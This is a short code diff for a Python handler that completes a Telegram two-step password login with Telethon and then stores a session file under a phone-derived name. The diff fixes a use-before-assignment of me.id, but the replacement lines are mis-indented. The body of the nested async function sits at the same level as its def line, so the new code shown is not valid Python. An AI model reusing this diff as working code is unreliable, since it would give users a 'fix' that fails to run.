@@ -186,13 +186,16 @@ def verify_password():
     password = data.get("password")
 
     async def _verify():
-        session_path = os.path.join(SESSIONS_DIR, str(me.id))
-        client = TelegramClient(session_path, API_ID, API_HASH)
-        await client.connect()
-        await client.sign_in(password=password)
-        me = await client.get_me()
-        await client.disconnect()
-        return me
+    client = TelegramClient(
+        os.path.join(SESSIONS_DIR, phone.replace("+", "")),
+        API_ID,
+        API_HASH
+    )
+    await client.connect()
+    await client.sign_in(password=password)
+    me = await client.get_me()
+    await client.disconnect()
+    return me
 
     try:
         me = asyncio.run(_verify())
